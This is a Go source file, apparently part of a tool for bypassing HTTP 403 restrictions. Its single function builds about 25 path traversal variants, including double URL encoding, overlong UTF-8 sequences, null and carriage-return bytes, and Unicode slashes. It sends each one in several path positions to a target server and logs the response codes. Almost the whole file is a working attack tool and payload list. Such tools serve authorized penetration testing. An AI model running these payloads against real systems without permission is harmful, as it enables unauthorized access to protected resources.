package bypass

import (
	"net/http"
	"net/url"
	"path/filepath"
	"strings"
)

// TestPathTraversal tests various path traversal techniques to bypass 403 responses
func TestPathTraversal(baseURL string, client *http.Client, config Config) ([]Result, error) {
	var results []Result
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Extract base directory and target path
	paths := strings.Split(parsedURL.Path, "/")
	var targetPath string
	if len(paths) > 0 {
		targetPath = paths[len(paths)-1]
	}

	traversals := []string{
		"..;/" + targetPath,
		"../;" + targetPath,
		"..%2f" + targetPath,
		"..%252f" + targetPath,
		".%2e/" + targetPath,
		"..%00/" + targetPath,
		"..%0d/" + targetPath,
		"..%5c" + targetPath,
		"/..%2f" + targetPath,
		// Advanced path traversals
		"..././" + targetPath,
		"..../" + targetPath,
		"....//" + targetPath,
		"...//" + targetPath,
		"..\\/" + targetPath,
		"..\\\\/" + targetPath,
		"..%c0%af/" + targetPath,
		"..%c1%9c/" + targetPath,
		"..%c0%af..%c0%af/" + targetPath,
		"..%ef%bc%8f" + targetPath, // Full-width slash
		"..%e0%80%af" + targetPath, // Another Unicode variant
		"%2e%2e%2f" + targetPath,
		"%2e%2e%5c" + targetPath,
		"%2e%2e%c0%af" + targetPath,
		"..%u2215" + targetPath, // Unicode slash
		"..%u2216" + targetPath, // Unicode backslash
	}

	// Get the directory part of the path
	dirPath := filepath.Dir(parsedURL.Path)
	if dirPath == "." {
		dirPath = "/"
	}

	for _, traversal := range traversals {
		manipulatedURL := *parsedURL

		// Try different positions for the traversal
		manipulatedURLs := []string{
			traversal,                 // Direct replacement
			dirPath + "/" + traversal, // Append to directory
			strings.Replace(parsedURL.Path, targetPath, traversal, 1), // Replace target
		}

		for _, manipulatedURLPath := range manipulatedURLs {
			manipulatedURL.Path = manipulatedURLPath

			req, err := http.NewRequest("GET", manipulatedURL.String(), nil)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", config.UserAgent)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			results = append(results, Result{
				URL:        manipulatedURL.String(),
				StatusCode: resp.StatusCode,
				Method:     "GET",
				Technique:  "Path Traversal",
			})
		}
	}

	return results, nil
}
